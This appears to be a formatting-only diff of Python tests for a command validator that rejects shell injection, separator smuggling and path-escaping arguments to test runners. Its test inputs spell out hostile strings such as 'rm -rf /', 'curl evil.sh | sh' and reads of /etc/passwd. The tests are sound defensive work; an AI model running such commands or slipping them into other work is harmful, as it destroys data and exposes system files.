@@ -56,20 +56,20 @@ def test_disallowed_binaries_rejected() -> None:
 
 def test_shell_metacharacters_rejected() -> None:
     for command in (
-        "pytest; rm -rf /",           # command separator
+        "pytest; rm -rf /",  # command separator
         "pytest && curl evil.sh | sh",  # chaining + pipe
         "pytest || true",
-        "pytest $(whoami)",            # command substitution
+        "pytest $(whoami)",  # command substitution
         "pytest `id`",
-        "pytest > /tmp/evil",          # redirect
+        "pytest > /tmp/evil",  # redirect
         "pytest < /etc/passwd",
-        "pytest &",                    # background
+        "pytest &",  # background
         # Quoted tokens are legal under arg-list execution (the shell never
         # sees them), but a quote that SMUGGLES a separator is not — shlex
         # strips the quotes, leaving the separator inside a token.
         "pytest 'x'; rm -rf /",
         'pytest "x" && curl evil.sh',
-        "pytest \\\\x",                 # backslash survives shlex into a token
+        "pytest \\\\x",  # backslash survives shlex into a token
         "pytest -x; cat /etc/passwd",
         "npm test > /dev/null",
         "go test | tee /tmp/x",
@@ -80,12 +80,12 @@ def test_shell_metacharacters_rejected() -> None:
 
 def test_path_escaping_arguments_rejected() -> None:
     for command in (
-        "pytest ../other/file.py",      # parent escape
+        "pytest ../other/file.py",  # parent escape
         "pytest ../../etc/passwd",
-        "pytest /etc/passwd",           # absolute path
-        "pytest ~/evil",                # home path
-        "pytest C:/windows/system32",   # drive letter (forward slash form)
-        "pytest C:\\windows\\evil",     # drive letter (backslash form)
+        "pytest /etc/passwd",  # absolute path
+        "pytest ~/evil",  # home path
+        "pytest C:/windows/system32",  # drive letter (forward slash form)
+        "pytest C:\\windows\\evil",  # drive letter (backslash form)
         "pytest ..",
         "pytest a/../b",
     ):
@@ -96,8 +96,16 @@ def test_path_escaping_arguments_rejected() -> None:
 def test_fixed_shape_binaries_reject_foreign_args() -> None:
     # npm/go/cargo only accept their fixed shapes — a free-form arg is a
     # smuggling attempt, not a flag.
-    for command in ("npm install", "npm run build", "npm ci", "go run .",
-                    "go build", "cargo build", "cargo run", "npm test -- --coverage"):
+    for command in (
+        "npm install",
+        "npm run build",
+        "npm ci",
+        "go run .",
+        "go build",
+        "cargo build",
+        "cargo run",
+        "npm test -- --coverage",
+    ):
         with pytest.raises(TestCommandError):
             validate_test_command(command)
 
